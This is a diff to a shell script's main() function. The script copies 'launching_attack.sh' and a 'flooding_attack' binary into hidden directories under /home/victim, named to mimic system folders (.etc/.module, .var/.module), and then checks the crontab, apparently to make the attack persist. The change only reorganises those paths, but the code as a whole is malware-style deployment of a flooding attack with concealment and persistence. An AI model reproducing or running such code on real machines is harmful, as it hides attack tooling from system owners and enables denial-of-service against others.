@@ -16,17 +16,18 @@ check_crontab() {
 main() {
   local home_dir="/home/victim"
   local launch_dir=".launch_attack"
-  local dir01=".etc/.module"
-  local dir02=".var/.module"
+  local dir01=".etc"
+  local dir02=".var"
+  local module_dir=".module"
   local launch_file="$home_dir/src/launching_attack.sh"
   local flooding_file="$home_dir/src/flooding_attack"
   mkdir -p "$home_dir/$launch_dir"
-  mkdir -p "$home_dir/$dir01"
-  mkdir -p "$home_dir/$dir02"
+  mkdir -p "$home_dir/$dir01/$module_dir"
+  mkdir -p "$home_dir/$dir02/$module_dir"
   mv "$home_dir/src/b" "$flooding_file" # reuse the provided file
   cp "$launch_file" "$home_dir/$launch_dir"
-  cp "$launch_file" "$flooding_file" "$home_dir/$dir01"
-  cp "$launch_file" "$flooding_file" "$home_dir/$dir02"
+  cp "$launch_file" "$flooding_file" "$home_dir/$dir01/$module_dir"
+  cp "$launch_file" "$flooding_file" "$home_dir/$dir02/$module_dir"
   check_crontab
 }
 main
